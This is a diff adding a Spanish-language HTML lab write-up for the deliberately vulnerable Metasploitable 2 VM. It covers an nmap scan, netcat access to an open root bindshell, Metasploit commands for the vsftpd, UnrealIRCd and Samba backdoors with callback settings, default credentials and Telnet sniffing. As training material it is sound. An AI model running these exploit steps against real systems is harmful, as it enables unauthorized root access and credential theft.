@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Writeup — Metasploitable 2</title>
+</head>
+<body>
+  <h1>Metasploitable 2 — Reconocimiento y acceso inicial</h1>
+  <p><strong>Fecha:</strong> 21-05-2026</p>
+  <p><strong>Herramientas:</strong> Nmap, Netcat, Metasploit, Wireshark</p>
+
+  <h2>Reconocimiento</h2>
+  <p>Escaneo de puertos con nmap para detectar servicios y versiones:</p>
+  <pre>nmap -sV 192.168.100.20</pre>
+
+  <h2>Hallazgos</h2>
+  <ul>
+    <li>Puerto 1524 — Bindshell expuesta (acceso root sin autenticación)</li>
+    <li>Puerto 21 — vsftpd 2.3.4 (CVE-2011-2523, backdoor)</li>
+    <li>Puerto 6667 — UnrealIRCd 3.2.8.1 (CVE-2010-2075, backdoor)</li>
+    <li>Puerto 445 — Samba usermap_script (CVE-2007-2447)</li>
+    <li>Puerto 22 — SSH credenciales default (msfadmin/msfadmin)</li>
+    <li>Puerto 23 — Telnet, credenciales en texto plano</li>
+  </ul>
+
+  <h2>Acceso via Bindshell (puerto 1524)</h2>
+  <pre>nc 192.168.100.20 1524
+whoami
+root</pre>
+
+  <h2>Explotación vsftpd 2.3.4</h2>
+  <pre>use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.100.20
+set LHOST 192.168.100.10
+run</pre>
+
+  <h2>Explotación UnrealIRCd</h2>
+  <pre>use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.100.20
+set LHOST 192.168.100.10
+run</pre>
+
+  <h2>Explotación Samba</h2>
+  <pre>use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.100.20
+set LHOST 192.168.100.10
+run</pre>
+
+  <h2>Sniffing Telnet con Wireshark</h2>
+  <p>Credenciales capturadas en texto plano via Wireshark filtrando tráfico Telnet.</p>
+
+  <p><a href="../index.html">← Volver</a></p>
+</body>
+</html>
